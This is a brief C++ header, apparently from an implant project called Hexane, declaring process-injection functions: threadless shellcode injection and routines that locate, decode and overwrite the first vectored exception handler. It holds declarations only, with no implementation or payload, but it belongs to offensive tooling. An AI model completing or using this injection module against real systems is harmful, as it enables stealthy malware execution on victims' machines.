#ifndef HEXANE_IMPLANT_INJECT_HPP
#define HEXANE_IMPLANT_INJECT_HPP
#include <core/corelib.hpp>

namespace Injection {
    FUNCTION VOID Threadless(const _threadless &writer, void *const shellcode, size_t n_shellcode, size_t total);

    namespace Veh {
        FUNCTION UINT_PTR GetFirstHandler(LDR_DATA_TABLE_ENTRY *module, const char *const signature, const char *const mask);
        FUNCTION UINT_PTR PointerEncodeDecode(uintptr_t const &pointer, const bool encode);
        FUNCTION NTSTATUS OverwriteFirstHandler(_veh_writer const &writer);
    }
}
#endif //HEXANE_IMPLANT_INJECT_HPP
